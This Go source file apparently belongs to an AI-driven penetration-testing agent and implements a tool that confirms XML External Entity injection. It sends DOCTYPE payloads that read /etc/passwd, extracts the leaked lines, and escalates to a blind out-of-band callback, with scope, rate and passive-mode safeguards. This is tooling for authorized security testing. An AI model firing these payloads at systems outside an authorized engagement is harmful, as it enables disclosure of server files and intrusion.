// Package agent — verify_xxe.go implements verify_xxe: a deterministic
// XML External Entity (XXE) confirmer, the XXE sibling of verify_sqli /
// verify_ssti.
//
// Endpoints that parse a POSTed XML document (import, upload, SOAP, SAML) are a
// classic XXE surface, but PROVING the bug still relied on the model
// hand-crafting a DOCTYPE + external-entity payload, reading the response, and
// recognizing that a local file leaked back — several turns of scarce budget for
// a class black-box scanners routinely miss. verify_xxe closes that loop in one
// call: it POSTs a randomized benign baseline, a nonce-scoped nonexistent-file
// control, and two identical external-entity probes. It confirms only stable
// file-derived evidence that is absent from both controls. Arbitrary custom
// content must remain intact between fresh nonce anchors; recognizable passwd
// content may be accepted without anchors when both probes expose the exact
// same extracted lines.
//
// A parser with external entities disabled (the safe configuration) echoes the
// literal &xxe; entity or drops it, never the file — so requiring the leak to be
// absent on the benign baseline separates a real, entity-expanding parser from a
// generic reflection.
//
// On confirmation it records exploit-proven evidence in the shared ledger
// (mirroring verify_sqli/verify_ssti) and tells the agent to report it as High
// CWE-611; it does NOT auto-report.
//
// Safety: like the other injection verifiers it resolves the target host
// internally, so it ALWAYS scope-checks the resolved host with
// scopeguard.IsLocalOrListener and refuses the operator's own machine/listener,
// honors the scan's request-rate policy and cancellation, uses the scan's
// session auth, does not follow redirects, and is disabled in passive mode.
package agent

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"html"
	"net/url"
	"regexp"
	"sort"
	"strings"
	"time"

	oobsrv "github.com/xalgord/xalgorix/v4/internal/oob"
	"github.com/xalgord/xalgorix/v4/internal/scanctx"
	"github.com/xalgord/xalgorix/v4/internal/scopeguard"
	"github.com/xalgord/xalgorix/v4/internal/tools"
	"github.com/xalgord/xalgorix/v4/internal/tools/httpclient"
)

func (a *Agent) registerVerifyXXETool(reg *tools.Registry) {
	reg.Register(&tools.Tool{
		Name:        "verify_xxe",
		Description: "Deterministically CONFIRM XML External Entity (XXE) injection on an endpoint that parses a POSTed XML document (the XXE sibling of verify_sqli/verify_ssti). Give it a ledger hypothesis_id OR a url. It sends a randomized benign baseline, a nonexistent-file control, and two identical external-entity probes for a local file (default file:///etc/passwd). Confirmation requires either recognizable file content or stable content isolated between nonce anchors; raw request reflection, fixed pages, blocked-entity placeholders, unstable responses, and truncated evidence fail closed. On success it records exploit-proven evidence in the ledger; report it as High CWE-611 (paste the leaked file content). When the endpoint parses XML but never reflects entity content, it AUTOMATICALLY escalates to a target-attributed out-of-band callback. Uses the scan session auth, does not follow redirects, disabled in passive mode. Reach for it the moment you find an endpoint that accepts XML (import/upload/SOAP/SAML).",
		Parameters: []tools.Parameter{
			{Name: "url", Description: "Absolute URL (scheme://host/path) or path of the XML-accepting endpoint. One of url or hypothesis_id is required.", Required: false},
			{Name: "hypothesis_id", Description: "Optional ledger hypothesis id carrying an HTTP path (e.g. H-7); its endpoint is used when 'url' is not given.", Required: false},
			{Name: "method", Description: "HTTP method (default POST).", Required: false},
			{Name: "file", Description: "Absolute local file path or file:// URI for the external entity to read (default /etc/passwd). Arbitrary text content can be proven when the endpoint returns parsed character data between the verifier's nonce anchors.", Required: false},
			{Name: "content_type", Description: "Content-Type for the XML body (default application/xml). Try text/xml if the endpoint is picky.", Required: false},
		},
		Execute: a.verifyXXETool,
	})
}

func (a *Agent) verifyXXETool(args map[string]string) (tools.Result, error) {
	l := a.ledger()
	if l == nil {
		return tools.Result{Error: "ledger unavailable in this context"}, nil
	}
	if normalizeActivityMode(a.scanIntensity) == activityModePassive {
		return tools.Result{Error: "verify_xxe issues live injection requests and is disabled in passive scan mode."}, nil
	}

	// Resolve the URL to test: explicit url wins, else the hypothesis endpoint.
	rawEP := strings.TrimSpace(args["url"])
	baseHint := ""
	if rawEP == "" {
		id := strings.TrimSpace(args["hypothesis_id"])
		if id == "" {
			return tools.Result{Error: "one of url or hypothesis_id is required — pass the XML endpoint url, or a ledger hypothesis id carrying an HTTP path."}, nil
		}
		h, ok := l.Get(id)
		if !ok {
			return tools.Result{Error: fmt.Sprintf("unknown hypothesis id %q — use read_ledger to list ids", id)}, nil
		}
		rawEP = strings.TrimSpace(h.Endpoint)
		baseHint = strings.TrimSpace(h.Target)
	}

	absURL, err := a.resolveInjectionURL(rawEP, baseHint)
	if err != nil {
		return tools.Result{Error: "verify_xxe: " + err.Error()}, nil
	}
	u, perr := url.Parse(absURL)
	if perr != nil || u.Host == "" {
		return tools.Result{Error: fmt.Sprintf("verify_xxe: could not form a valid URL from %q", absURL)}, nil
	}

	// PRIMARY scope protection: the loop gate can't see this internally-resolved
	// host, so refuse the operator's own machine/listener here.
	if scopeguard.IsLocalOrListener(a.localGuard, u.Host) {
		return tools.Result{Error: fmt.Sprintf("verify_xxe refused: %q resolves to the operator's own machine or local network, not the engagement target.", u.Host)}, nil
	}

	method := strings.ToUpper(strings.TrimSpace(args["method"]))
	if method == "" {
		method = "POST"
	}
	file := strings.TrimSpace(args["file"])
	if file == "" {
		file = "/etc/passwd"
	}
	contentType := strings.TrimSpace(args["content_type"])
	if contentType == "" {
		contentType = "application/xml"
	}

	headers := a.probeAuthHeaders()
	authed := len(headers) > 0
	if headers == nil {
		// probeAuthHeaders returns nil when the scan has no session; we still
		// need a map to set the XML Content-Type without panicking.
		headers = map[string]string{}
	}
	headers["Content-Type"] = contentType

	markers, err := newXXEProbeMarkers()
	if err != nil {
		return tools.Result{Error: fmt.Sprintf("verify_xxe: could not create proof markers: %v", err)}, nil
	}
	fileURI, err := xxeFileURI(file)
	if err != nil {
		return tools.Result{Error: "verify_xxe: " + err.Error()}, nil
	}
	missingURI := "file:///xalgorix-xxe-missing-" + markers.Nonce
	baselineBody := fmt.Sprintf("<?xml version=\"1.0\" encoding=\"UTF-8\"?><data>%s%s%s</data>", markers.Start, markers.Control, markers.End)
	missingBody := xxeProbeDocument(missingURI, markers)
	probeBody := xxeProbeDocument(fileURI, markers)

	if stop := a.injectionRateGate(); stop != "" {
		return tools.Result{Error: stop}, nil
	}
	baselineResp, bErr := a.sendXMLProbe(method, absURL, headers, baselineBody)
	if bErr != nil {
		return tools.Result{Error: fmt.Sprintf("verify_xxe: baseline request failed: %v", bErr)}, nil
	}
	if stop := a.injectionRateGate(); stop != "" {
		return tools.Result{Error: stop}, nil
	}
	missingResp, mErr := a.sendXMLProbe(method, absURL, headers, missingBody)
	if mErr != nil {
		return tools.Result{Error: fmt.Sprintf("verify_xxe: nonexistent-file control failed: %v", mErr)}, nil
	}
	if stop := a.injectionRateGate(); stop != "" {
		return tools.Result{Error: stop}, nil
	}
	probeResp, pErr := a.sendXMLProbe(method, absURL, headers, probeBody)
	if pErr != nil {
		return tools.Result{Error: fmt.Sprintf("verify_xxe: XXE payload request failed: %v", pErr)}, nil
	}
	if stop := a.injectionRateGate(); stop != "" {
		return tools.Result{Error: stop}, nil
	}
	repeatResp, rErr := a.sendXMLProbe(method, absURL, headers, probeBody)
	if rErr != nil {
		return tools.Result{Error: fmt.Sprintf("verify_xxe: repeated XXE payload request failed: %v", rErr)}, nil
	}

	confirmed, note, leakedContent := xxeDifferentialLeakVerdict(
		baselineResp,
		missingResp,
		probeResp,
		repeatResp,
		file,
		markers,
	)
	endpoint := u.EscapedPath()
	authTag := ""
	if authed {
		authTag = " [authenticated]"
	}

	if !confirmed {
		// Many XXE sinks parse the document but never reflect entity content,
		// so an in-band file-read probe reports nothing (observed in production:
		// an endpoint with a proven entity-resolving parser was declared XXE
		// negative). Escalate automatically to blind XXE: plant the OAST
		// callback URL in an external SYSTEM entity and confirm from the
		// target-originated callback, mirroring verify_oob's provenance rules.
		blindResult := a.blindXXEVerify(method, absURL, headers, endpoint, authTag)
		if blindResult != nil {
			return *blindResult, nil
		}
		return tools.Result{
			Output:   fmt.Sprintf("XXE NOT confirmed at %s%s: %s", endpoint, authTag, note),
			Metadata: map[string]any{"xxe_confirmed": false, "endpoint": endpoint},
		}, nil
	}

	probeExcerpt := boundedText(leakedContent, 600)
	confirm := fmt.Sprintf("XML External Entity injection CONFIRMED at %s%s: an external entity reading %s produced stable file-derived response content absent from both the benign baseline and nonexistent-file control — the XML parser expands external entities (CWE-611).", endpoint, authTag, file)
	proof := fmt.Sprintf("Benign status=%d; missing-file control status=%d; repeated XXE statuses=%d/%d.\nXXE payload (<!ENTITY xxe SYSTEM %q>) leaked %s:\n%s\n%s", baselineResp.StatusCode, missingResp.StatusCode, probeResp.StatusCode, repeatResp.StatusCode, fileURI, file, probeExcerpt, note)

	h := l.Upsert(scanctx.Hypothesis{
		Title:      "XML External Entity injection at " + endpoint,
		VulnClass:  "xxe",
		Endpoint:   endpoint,
		Target:     baseURLOf(u),
		Confidence: 0.95,
		Status:     scanctx.HypothesisTesting,
		Origin:     "verify_xxe",
		NextAction: "Report as High XML External Entity injection (CWE-611) using the leaked file content as proof, then consider escalating (SSRF via http(s):// entities, blind XXE via an OOB callback) and link the finding via add_hypothesis_evidence(kind=finding_ref).",
	})
	l.AddEvidence(h.ID, scanctx.Evidence{
		Kind:       "exploit",
		Summary:    confirm,
		Request:    probeResp.RequestLine,
		Response:   probeExcerpt,
		Confidence: 0.95,
		AgentID:    a.ledgerOrigin(),
	})

	return tools.Result{
		Output:   confirm + fmt.Sprintf(" Recorded exploit-proven in the ledger (%s) — report it as High CWE-611 and link the finding.\n\n%s", h.ID, proof),
		Metadata: map[string]any{"xxe_confirmed": true, "endpoint": endpoint, "hypothesis_id": h.ID},
	}, nil
}

// sendXMLProbe POSTs an XML body to rawURL (the host was scope-checked by the
// caller) and returns the response details used by the differential proof.
func (a *Agent) sendXMLProbe(method, rawURL string, headers map[string]string, body string) (xxeProbeCapture, error) {
	reqLine := fmt.Sprintf("%s %s (xml body, %dB)", method, rawURL, len(body))
	resp, e := httpclient.SendRaw(httpclient.RawRequest{
		Method:          method,
		URL:             rawURL,
		Headers:         headers,
		Body:            body,
		FollowRedirects: false,
		TimeoutSec:      30,
	})
	if e != nil {
		return xxeProbeCapture{RequestLine: reqLine}, e
	}
	return xxeProbeCapture{
		Body:        string(resp.Body),
		RequestLine: reqLine,
		StatusCode:  resp.StatusCode,
		Truncated:   resp.Truncated,
	}, nil
}

type xxeProbeMarkers struct {
	Nonce   string
	Start   string
	End     string
	Control string
}

type xxeProbeCapture struct {
	Body        string
	RequestLine string
	StatusCode  int
	Truncated   bool
}
type xxeAnchorState uint8

const (
	xxeAnchorAbsent xxeAnchorState = iota
	xxeAnchorSingle
	xxeAnchorInvalid
)

func newXXEProbeMarkers() (xxeProbeMarkers, error) {
	raw := make([]byte, 16)
	if _, err := rand.Read(raw); err != nil {
		return xxeProbeMarkers{}, err
	}
	nonce := hex.EncodeToString(raw)
	return xxeProbeMarkers{
		Nonce:   nonce,
		Start:   "xalgorix-xxe-start-" + nonce,
		End:     "xalgorix-xxe-end-" + nonce,
		Control: "xalgorix-xxe-control-" + nonce,
	}, nil
}

func containsXXEFileControl(value string) bool {
	for _, r := range value {
		if r < 0x20 || r == 0x7f {
			return true
		}
	}
	return false
}

func xxeFileURI(file string) (string, error) {
	file = strings.TrimSpace(file)
	if file == "" {
		return "", fmt.Errorf("file must be an absolute local path or file:// URI")
	}
	if containsXXEFileControl(file) {
		return "", fmt.Errorf("file contains control characters")
	}

	lower := strings.ToLower(file)
	if strings.HasPrefix(lower, "file:") {
		if !strings.HasPrefix(lower, "file://") {
			return "", fmt.Errorf("file URI must use the file:// form")
		}
		parsed, err := url.Parse(file)
		if err != nil || !strings.EqualFold(parsed.Scheme, "file") {
			return "", fmt.Errorf("file must be a valid file:// URI")
		}
		if parsed.Opaque != "" || parsed.User != nil || parsed.RawQuery != "" || parsed.ForceQuery || parsed.Fragment != "" {
			return "", fmt.Errorf("file URI cannot contain user info, a query, a fragment, or opaque data")
		}
		if parsed.Host != "" && !strings.EqualFold(parsed.Host, "localhost") {
			return "", fmt.Errorf("file URI must reference the target's local filesystem, not a remote host")
		}
		if parsed.Path == "" || !strings.HasPrefix(parsed.Path, "/") {
			return "", fmt.Errorf("file URI path must be absolute")
		}
		if containsXXEFileControl(parsed.Path) {
			return "", fmt.Errorf("file URI path contains control characters")
		}
		return strings.ReplaceAll((&url.URL{Scheme: "file", Host: parsed.Host, Path: parsed.Path}).String(), "&", "%26"), nil
	}

	path := file
	if strings.HasPrefix(file, "//") {
		return "", fmt.Errorf("file path must not reference a remote or UNC host")
	}
	if len(file) >= 3 && file[1] == ':' && (file[2] == '\\' || file[2] == '/') {
		path = "/" + strings.ReplaceAll(file, "\\", "/")
	} else if !strings.HasPrefix(file, "/") {
		return "", fmt.Errorf("file path must be absolute")
	}
	return strings.ReplaceAll((&url.URL{Scheme: "file", Path: path}).String(), "&", "%26"), nil
}

func xxeProbeDocument(fileURI string, markers xxeProbeMarkers) string {
	return fmt.Sprintf("<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE data [<!ENTITY xxe SYSTEM %q>]><data>%s&xxe;%s</data>", fileURI, markers.Start, markers.End)
}
func xxeDifferentialLeakVerdict(
	baseline xxeProbeCapture,
	missing xxeProbeCapture,
	first xxeProbeCapture,
	second xxeProbeCapture,
	file string,
	markers xxeProbeMarkers,
) (confirmed bool, note, leakedContent string) {
	if baseline.Truncated || missing.Truncated || first.Truncated || second.Truncated {
		return false, "at least one response was truncated, so the differential evidence is incomplete.", ""
	}
	if first.StatusCode != second.StatusCode {
		return false, "the repeated external-entity probes returned different HTTP statuses, so the result is unstable.", ""
	}
	if looksLikeFileLeak(baseline.Body, file) || looksLikeFileLeak(missing.Body, file) {
		return false, "recognizable file-content markers already occur in a control response, so they are not attributable to the requested external entity.", ""
	}
	firstPasswd := extractPasswdEvidence(first.Body)
	secondPasswd := extractPasswdEvidence(second.Body)
	if len(firstPasswd) > 0 || len(secondPasswd) > 0 {
		if looksLikeXXEBlockMessage(first.Body) || looksLikeXXEBlockMessage(second.Body) {
			return false, "the response contains an entity-blocking or parser-error message, so passwd-shaped text is not reliable file-read evidence.", ""
		}
		if containsRawXXESyntax(first.Body) || containsRawXXESyntax(second.Body) {
			return false, "the response reflected entity syntax alongside passwd-shaped text, so expansion is not proven.", ""
		}
		if !sameStrings(firstPasswd, secondPasswd) {
			return false, "the extracted passwd evidence changed across identical entity probes, so the result is unstable.", ""
		}
		return true, "the same recognizable passwd content appeared on both repeated entity probes and on neither control.", strings.Join(firstPasswd, "\n")
	}

	baselineValue, baselineState := xxeAnchoredValue(baseline.Body, markers)
	if baselineState != xxeAnchorSingle || baselineValue != markers.Control {
		return false, "the benign response did not return exactly one intact nonce-anchored control value, so arbitrary response content cannot be attributed safely.", ""
	}
	if baseline.StatusCode != first.StatusCode || first.StatusCode != second.StatusCode {
		return false, "the benign and repeated entity probes did not retain one stable HTTP status, so an error-page differential is not exploit proof.", ""
	}

	missingValue, missingState := xxeAnchoredValue(missing.Body, markers)
	switch missingState {
	case xxeAnchorInvalid:
		return false, "the nonexistent-file control returned ambiguous or duplicate nonce anchors.", ""
	case xxeAnchorSingle:
		if strings.TrimSpace(missingValue) != "" && !isLiteralXXEEntity(missingValue) {
			return false, "the nonexistent-file control inserted non-empty content between the nonce anchors, so the target response is not a clean file-read differential.", ""
		}
	}

	firstValue, firstState := xxeAnchoredValue(first.Body, markers)
	secondValue, secondState := xxeAnchoredValue(second.Body, markers)
	if firstState != xxeAnchorSingle || secondState != xxeAnchorSingle {
		return false, "the repeated entity responses did not each contain exactly one intact nonce-anchored value.", ""
	}
	if firstValue != secondValue {
		return false, "the content isolated between nonce anchors changed across identical entity probes, so the result is unstable.", ""
	}

	candidate := strings.TrimSpace(firstValue)
	if len(candidate) < 8 {
		return false, "the nonce-anchored entity result was empty or too short to distinguish safely from a placeholder.", ""
	}
	if isLiteralXXEEntity(candidate) || containsRawXXESyntax(first.Body) || containsRawXXESyntax(second.Body) {
		return false, "the response reflected the entity syntax rather than proving that the parser expanded it.", ""
	}
	if looksLikeXXEBlockMessage(candidate) {
		return false, "the nonce-anchored value is an entity-blocking or parser placeholder, not returned file content.", ""
	}
	if looksLikeRequestedFileReflection(candidate, file) {
		return false, "the nonce-anchored value merely repeats the requested filename or path, not file content.", ""
	}
	if strings.Contains(baseline.Body, candidate) || strings.Contains(missing.Body, candidate) {
		return false, "the same nonce-anchored candidate content already appears in a control response.", ""
	}
	return true, "the same non-empty value appeared between fresh nonce anchors on both file probes, while the benign and nonexistent-file controls did not contain it.", firstValue
}

func sameStrings(first, second []string) bool {
	if len(first) != len(second) {
		return false
	}
	for i := range first {
		if first[i] != second[i] {
			return false
		}
	}
	return true
}

func looksLikeRequestedFileReflection(candidate, file string) bool {
	normalize := func(value string) string {
		value = strings.TrimSpace(strings.ToLower(html.UnescapeString(value)))
		if decoded, err := url.PathUnescape(value); err == nil {
			value = decoded
		}
		return strings.ReplaceAll(value, "\\", "/")
	}

	candidateValue := normalize(candidate)
	fileValue := normalize(file)
	variants := []string{fileValue}
	if uri, err := xxeFileURI(file); err == nil {
		variants = append(variants, normalize(uri))
		if parsed, parseErr := url.Parse(uri); parseErr == nil {
			variants = append(variants, normalize(parsed.Path))
		}
	}
	for _, variant := range variants {
		if variant != "" && strings.Contains(candidateValue, variant) {
			return true
		}
	}
	parts := strings.Split(strings.TrimRight(fileValue, "/"), "/")
	basename := parts[len(parts)-1]
	trimmed := strings.Trim(candidateValue, " \t\r\n\"'\x60<>[](){}")
	for _, prefix := range []string{"file:", "path:", "requested file:", "requested path:"} {
		trimmed = strings.TrimSpace(strings.TrimPrefix(trimmed, prefix))
	}
	return basename != "" && trimmed == basename
}

func xxeAnchoredValue(body string, markers xxeProbeMarkers) (string, xxeAnchorState) {
	startCount := strings.Count(body, markers.Start)
	endCount := strings.Count(body, markers.End)
	if startCount == 0 && endCount == 0 {
		return "", xxeAnchorAbsent
	}
	if startCount != 1 || endCount != 1 {
		return "", xxeAnchorInvalid
	}
	start := strings.Index(body, markers.Start) + len(markers.Start)
	endOffset := strings.Index(body[start:], markers.End)
	if endOffset < 0 {
		return "", xxeAnchorInvalid
	}
	return body[start : start+endOffset], xxeAnchorSingle
}

func normalizedXXESyntax(value string) string {
	value = strings.ToLower(value)
	value = strings.NewReplacer(
		"\\u0026", "&",
		"\\u003b", ";",
		"\\x26", "&",
		"\\x3b", ";",
	).Replace(value)
	return html.UnescapeString(value)
}

func isLiteralXXEEntity(value string) bool {
	return strings.Contains(normalizedXXESyntax(value), "&xxe;")
}

func containsRawXXESyntax(value string) bool {
	normalized := normalizedXXESyntax(value)
	return strings.Contains(normalized, "<!doctype") || strings.Contains(normalized, "<!entity") || strings.Contains(normalized, "&xxe;")
}

func looksLikeXXEBlockMessage(value string) bool {
	lower := strings.ToLower(value)
	for _, marker := range []string{
		"external entity blocked",
		"external entity disabled",
		"external entity denied",
		"external entities are disabled",
		"entity is not allowed",
		"entity not allowed",
		"doctype is not allowed",
		"doctype not allowed",
		"failed to load external entity",
		"cannot resolve external entity",
		"could not resolve external entity",
		"entity is not defined",
		"entity not defined",
		"xml parse error",
		"xml parser error",
		"not well-formed",
	} {
		if strings.Contains(lower, marker) {
			return true
		}
	}
	return false
}

// xxeLeakVerdict confirms XXE when the probe response reveals local-file content
// that the benign baseline did not — proof the parser resolved the external
// SYSTEM entity. A baseline that already shows the markers is rejected (the
// content is not controlled by the entity).
func xxeLeakVerdict(baseline, probe, file string) (confirmed bool, note string) {
	if looksLikeFileLeak(baseline, file) {
		return false, "the benign baseline ALREADY contains the file-content markers, so the response is not controlled by the external entity — not a proven XXE (pick a target file whose content is not already on the page)."
	}
	if looksLikeFileLeak(probe, file) {
		return true, "the file content appeared only on the external-entity payload and not on the benign baseline — the parser resolved a SYSTEM file:// entity (classic in-band XXE)."
	}
	return false, "the XXE payload did not return recognizable file content — external entities may be disabled (safe), the entity may be resolved out-of-band only (use verify_oob with an http(s):// entity for blind XXE), or the endpoint may want a different Content-Type (try text/xml) or XML shape."
}

// passwdLineRe extracts complete /etc/passwd-style lines. Comparing the
// normalized line set across repeated probes prevents a stable-looking verdict
// from two different error pages that happen to contain passwd-shaped text.
var passwdLineRe = regexp.MustCompile("(?m)[a-zA-Z_][a-zA-Z0-9_.-]*:[^:\\r\\n]*:\\d+:\\d+:[^:\\r\\n]*:[^:\\r\\n]*:[^[:space:]<>\\\"']+")

func extractPasswdEvidence(body string) []string {
	matches := passwdLineRe.FindAllString(html.UnescapeString(body), -1)
	if len(matches) == 0 {
		return nil
	}
	seen := make(map[string]struct{}, len(matches))
	evidence := make([]string, 0, len(matches))
	for _, match := range matches {
		match = strings.TrimSpace(match)
		if _, exists := seen[match]; exists {
			continue
		}
		seen[match] = struct{}{}
		evidence = append(evidence, match)
	}
	// The response order is not evidence. Sorting makes equivalent transformed
	// responses compare equal while still requiring the exact same line set.
	sort.Strings(evidence)
	return evidence
}

// looksLikeFileLeak reports recognizable passwd content. Arbitrary target files
// are proven through the nonce-anchored differential path instead.
func looksLikeFileLeak(body, _ string) bool {
	return len(extractPasswdEvidence(body)) > 0
}

func pollBlindXXE(ctx context.Context, token string, waits []time.Duration) ([]oobsrv.Interaction, error) {
	if ctx == nil {
		ctx = context.Background()
	}
	if err := ctx.Err(); err != nil {
		return nil, err
	}
	for _, wait := range waits {
		timer := time.NewTimer(wait)
		select {
		case <-timer.C:
		case <-ctx.Done():
			if !timer.Stop() {
				select {
				case <-timer.C:
				default:
				}
			}
			return nil, ctx.Err()
		}
		if err := ctx.Err(); err != nil {
			return nil, err
		}
		hits := oobsrv.Poll(token)
		if len(hits) > 0 {
			return hits, nil
		}
	}
	return nil, nil
}

// blindXXEVerify escalates an in-band XXE negative to a blind confirmation.
// It mints an OAST callback, sends an XML document whose external SYSTEM entity
// references the callback, polls the interaction store, and applies verify_oob's
// provenance rules (non-scanner HTTP confirms at 0.9, DNS at 0.75). Returns nil
// when blind testing is unavailable (OAST not configured) or produced no
// interactions, leaving the caller's in-band negative in effect.
func (a *Agent) blindXXEVerify(method, absURL string, headers map[string]string, endpoint, authTag string) *tools.Result {
	if a.ctx != nil && a.ctx.Err() != nil {
		return &tools.Result{Error: "verify_xxe: scan is shutting down before blind verification"}
	}
	if !oobsrv.Enabled() {
		return nil
	}
	if stop := a.injectionRateGate(); stop != "" {
		return &tools.Result{Error: stop}
	}
	callbackURL, token, err := oobsrv.Generate()
	if err != nil || callbackURL == "" {
		return nil
	}
	if a.ctx != nil && a.ctx.Err() != nil {
		return &tools.Result{Error: "verify_xxe: scan is shutting down before the blind request"}
	}
	blindBody := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE data [<!ENTITY xxe SYSTEM %q>]><data>&xxe;</data>`, callbackURL)
	if _, bErr := a.sendXMLProbe(method, absURL, headers, blindBody); bErr != nil {
		if a.ctx != nil && a.ctx.Err() != nil {
			return &tools.Result{Error: "verify_xxe: scan is shutting down during blind verification"}
		}
		return nil
	}

	// Poll for the callback: entity fetches are fast when egress allows HTTP,
	// and DNS-only egress still resolves the callback host. Cancellation wins
	// immediately so shutdown never waits out the full blind-verifier window.
	hits, pollErr := pollBlindXXE(a.ctx, token, []time.Duration{3 * time.Second, 4 * time.Second, 5 * time.Second})
	if pollErr != nil {
		return &tools.Result{Error: "verify_xxe: scan is shutting down while waiting for a blind callback"}
	}
	if len(hits) == 0 {
		return nil
	}

	t := tallyOOB(hits)
	confirmed := false
	confidence := 0.0
	verdict := ""
	switch {
	case t.nonScannerHTTP > 0:
		confirmed, confidence = true, 0.9
		verdict = "the target fetched the external SYSTEM entity out-of-band (assessed non-scanner HTTP callback) — the parser resolves external entities (blind XXE, CWE-611)"
	case t.dns > 0:
		confirmed, confidence = true, 0.75
		verdict = "the target's resolver looked up the callback host planted in the external entity (DNS callback) — the parser resolves external entities (blind XXE, CWE-611)"
	default:
		verdict = "only scanner-origin / origin-unassessed interactions arrived — not attributable to the target"
	}
	if !confirmed {
		return nil
	}

	confirm := fmt.Sprintf("XML External Entity injection CONFIRMED (blind) at %s%s: %s.", endpoint, authTag, verdict)
	if l := a.ledger(); l != nil {
		h := l.Upsert(scanctx.Hypothesis{
			Title:      "XML External Entity injection (blind) at " + endpoint,
			VulnClass:  "xxe",
			Endpoint:   endpoint,
			Target:     baseURLOf(mustParseURL(absURL)),
			Confidence: confidence,
			Status:     scanctx.HypothesisTesting,
			Origin:     "verify_xxe",
			NextAction: "Report as High XML External Entity injection (CWE-611) using the target-originated OAST callback as proof; in-band file read may also be possible — try escalating with a file:// entity. Link the finding via add_hypothesis_evidence(kind=finding_ref).",
		})
		l.AddEvidence(h.ID, scanctx.Evidence{
			Kind:       "exploit",
			Summary:    confirm,
			Request:    fmt.Sprintf("%s %s (blind external-entity payload, OAST token %s)", method, absURL, token),
			Response:   firstHitSummary(hits),
			Confidence: confidence,
			AgentID:    a.ledgerOrigin(),
		})
		return &tools.Result{
			Output:   confirm + fmt.Sprintf(" Recorded exploit-proven in the ledger (%s) — report it as High CWE-611 and link the finding.", h.ID),
			Metadata: map[string]any{"xxe_confirmed": true, "xxe_blind": true, "endpoint": endpoint, "hypothesis_id": h.ID},
		}
	}
	return &tools.Result{
		Output:   confirm,
		Metadata: map[string]any{"xxe_confirmed": true, "xxe_blind": true, "endpoint": endpoint},
	}
}

// mustParseURL parses rawURL for target bookkeeping where failure is impossible
// (the caller already url.Parse'd it successfully).
func mustParseURL(rawURL string) *url.URL {
	u, _ := url.Parse(rawURL)
	return u
}
